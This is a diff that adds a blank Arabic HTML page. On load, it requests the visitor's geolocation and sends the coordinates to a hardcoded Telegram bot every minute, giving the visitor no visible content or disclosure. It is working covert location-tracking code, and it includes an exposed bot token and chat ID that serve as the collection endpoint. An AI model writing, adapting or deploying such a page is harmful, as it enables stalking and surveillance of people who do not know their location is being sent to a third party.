@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديد الموقع تلقائيًا</title>
+    <script>
+        const botToken = '5909067412:AAF16T7_MliWPBOIsALuQsoRAbb_dbXyvnM'; // استبدل هذا بتوكن البوت الخاص بك
+        const chatId = '1051175859'; // استبدل هذا بمعرف الدردشة الخاص بك
+
+        function startLocationTracking() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+                // تحديد الموقع كل دقيقة (60000 مللي ثانية)
+                setInterval(() => {
+                    navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+                }, 60000);
+            } else {
+                document.getElementById("result").innerHTML = "المتصفح لا يدعم تحديد الموقع.";
+            }
+        }
+
+        function sendLocationToTelegram(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const message = `خط العرض: ${latitude}\nخط الطول: ${longitude}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        console.log("تم إرسال الموقع إلى تلجرام");
+                    } else {
+                        console.error("فشل في إرسال الموقع إلى تلجرام");
+                    }
+                })
+                .catch(error => console.error("خطأ:", error));
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("result").innerHTML = "تم رفض الإذن لتحديد الموقع.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("result").innerHTML = "معلومات الموقع غير متاحة.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("result").innerHTML = "انتهت المهلة لتحديد الموقع.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("result").innerHTML = "حدث خطأ غير معروف.";
+                    break;
+            }
+        }
+    </script>
+</head>
+<body onload="startLocationTracking()">
+</body>
+</html>
